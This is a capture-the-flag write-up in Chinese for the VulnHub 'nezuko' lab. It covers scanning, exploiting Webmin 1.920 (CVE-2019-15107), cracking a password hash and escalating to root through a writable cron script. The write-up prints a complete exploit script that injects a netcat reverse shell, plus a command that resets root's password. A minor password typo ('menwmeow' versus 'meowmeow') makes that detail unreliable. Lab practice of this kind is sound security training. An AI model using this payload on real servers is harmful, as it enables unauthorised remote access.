---
title: VulnHub-nezuko
author: AmtuOrRF
date: 2022-02-13
categories: [vulnhub]
tags: [vulnhub]
---
*2022 年 2 月 13 日，星期日*
### Introduction
> Creator : @yunaranyancat (Twitter)

> Difficulty : Easy ~ Intermediate

> OS Used: Ubuntu 18.04

> Services : Webmin 1.920, Apache, SSH

> User : root, zenitsu, nezuko

> Hashes : at their home directory


### Table Of Content
- nmap
- base32解密,得到没用的提示
- 运行searchsploit然后使用 Metasploit 来利用 Webmin
- 使用john破解在/etc/passwd发现的密码sha512crypt
- 滥用可写脚本
### namp
* kali IP : 192.168.84.5
```bash
$ nmap -sV -p- -sC -oN nmap 192.168.84.8
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-12 22:56 EST
Nmap scan report for 192.168.84.8
Host is up (0.00042s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)
|   256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)
|_  256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)
80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to my site! - nezuko kamado
13337/tcp open  ssl/http MiniServ 1.920 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on ubuntu
| Not valid before: 2019-08-20T09:28:46
|_Not valid after:  2024-08-18T09:28:46
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:E1:A5:C7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### base32解密,得到没用的提示
```bash
$ curl http://192.168.84.8/robots.txt | base32 -d

hint from nezuko : this is not the right port to enumerate ^w^
```
### 运行searchsploit然后使用 Metasploit 来利用 Webmin

在13337端口上运行着Webmin ,版本是1.920
```bash
$ whatweb https://192.168.84.8:13337

https://192.168.84.8:13337 [200 OK] Cookies[redirect,testing], Country[RESERVED][ZZ], HTML5, HTTPServer[MiniServ/1.920],IP[192.168.84.8], PasswordField[pass], Script, Title[Login to Webmin], UncommonHeaders[auth-type,content-security-policy], X-Frame-Options[SAMEORIGIN]

# MiniServ/1.920
```

使用 searchsploit 搜索相关漏洞
```bash
$ searchsploit Webmin 1.920
# linux/webapps/47293.sh

$ ./47293.sh https://192.168.84.8:13337

Testing for RCE (CVE-2019-15107) on https://192.168.84.8:13337: VULNERABLE!
```

漏洞是存在的接下来就是反弹一个shell
```bash
$ nc -lvp 1234
# 先在kali监听1234端口

```
exp.sh 的内容
```bash
URI=$1;
exp='nc 192.168.84.5 1234 -e /bin/bash';
curl -ks $URI'/password_change.cgi' -d "user=wheel&pam=&expired=2&old=$exp&new1=wheel&new2=wheel" -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi'
```
运行 exp.sh,然后监听的那边就返回了一个shell
```bash
$ ./exp.sh https://192.168.84.8:13337
```

### 使用john破解在/etc/passwd发现的密码sha512crypt
进入系统后,查看`/etc/passwd`,发现zenitsu 密码 sha
```text
zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash
```

破解，得到密码. `zenitsu`:`menwmeow`
```bash
$ cat hash 
$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0

$ john hash 
meowmeow         (?)
```

### 滥用可写脚本
```bash
zenitsu@ubuntu:~/to_nezuko$ pwd
/home/zenitsu/to_nezuko
zenitsu@ubuntu:~/to_nezuko$ ls
send_message_to_nezuko.sh
zenitsu@ubuntu:~/to_nezuko$
# root 每 5 分钟运行一次send_message_to_nezuko.sh

$ echo "echo root:123|chpasswd" >> send_message_to_nezuko.sh
# 等待5分钟后 root 的密码就是 123

$ su root
password: 123
```
```bash
# cat root.txt
Congratulations on getting the root shell!
Tell me what do you think about this box at my twitter, @yunaranyancat

.................                                                                                          ..........................                  ........
................                                                                                            ........................                   ........
...............                                     ...   .       .                                         ........................                   ........
      .  ... ..                                 ...............................                             ........................                   ........
.    ...........                             ....................................                          .........................                   ........
.  ... .........                          .................,,,,,,,,.................                       .........................                   ........
       .. ......                         ..............,,,,,,,,,,,,,,,,,,............                      .........................                   ........
.       .   ....                        ...........,,,,,,,,,,,,,,,,,,,,,,,,,,.........                      ........................                    ..... .
              .                        .........,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,........                        ......................                    .......
      .  . .                          .......,,,,,,,,,,,,,,,,,,******,*********,.......                        .....................                    .......
          .                          .....,,,,,,,,,,,,,,***,**********************......                          ..................                    .......
                                   ....,,,,,,,,,,***********************************.....                          .................                    .... ..
                                  ...,,,,*********************************************.....                       ..................                    . .....
                                ....**********,.    .,*****************,       ,********....                      ..................                    . .....
                               ...******,  ,***************************************. *****...                     ..................                       .. .
                              ...*** .**************,***********************************,,*,..                    ..................                        ...
                             ..,.,******************.,*****************,..,*****************,.                  ................. .                       .    
                             ..**************,,,.......***************,.,......,*************.                 ............... ...                             
                             .**********************,,,,*************,,.*********************,                ................ .. .                            
                             .**********          .***.,,************,***.            ,.******               .............                                     
                              ******     *(###(/,   **/*,,*********////*   ,(#####(*     *////              ..............                                     
                              ,***    ,##########/,, **///////////////*...,##########(,..  .,/              ...  ..                                            
                               ***..,..,,,,,,,,,,,,/,*///////////////////..,,,*****,,,,*,,.//*             ..  ....       .                                    
                                //////.............//////////////////////............../////*                ..... ..                                          
                                 *////.            ///////////////////////            .((//,                 ..                                                
                                  ,////,          ///////////////////////(,           ((//. .                                                                  
                                   *//.*// ...  **.///////////////////////./ ...... //.//..                                                                    
                                    ///////////////////////////////////////////////,///// .                                                                    
                                     /////////////////////*,,/////////////////////////// .                                                                     
                                  ,. .///////////////////,,,,//////////////////////////,...,                                                                   
                                 , ,,.*///////////////////*,,//////////////////////////,,, ,                                                                   
                                 ,,.,,/////////////////////////////////////////////////,/ ,.                                                                   
                                    ,/,///////////////////////////////////////////////*/                                                                       
                                     */////////////////////////////////////////////////                                                                        
                                      .///////////////,////////////////,//////////////                                                                         
                                        ////////////////.............,//////////////*                                                                          
                                          ///////////////////,,,,//////////////////                                                                            
                                            *////////////////*,,,////////////////                                                                              
                                         .,, , ///////////////////////////////.,,,,,.                                                                          
                                       /,,,, /,,, *////////////////////////..,,/..,,,/                                                                         
                                       /*,,,,,,,,.,.  //////////////////  ,.,,,,,,,,,/                                                                         
                                       ,//,,,,,,,,,,,,,,, ,/////////.,,,,,,,,,,,,,,//                                                                          
                                          *,,,,,,,,,...,,,,,,.   ,,,,,,,,..,,,,,,,.  .//,                                                                      
                                    */*.        .,,,,,,,,,,.,,.,,.,,,,,,,,,,,.       ,**/***                                                                   


3ca33b8158d9dee5c35a7d6d793c7fd5
```
$end$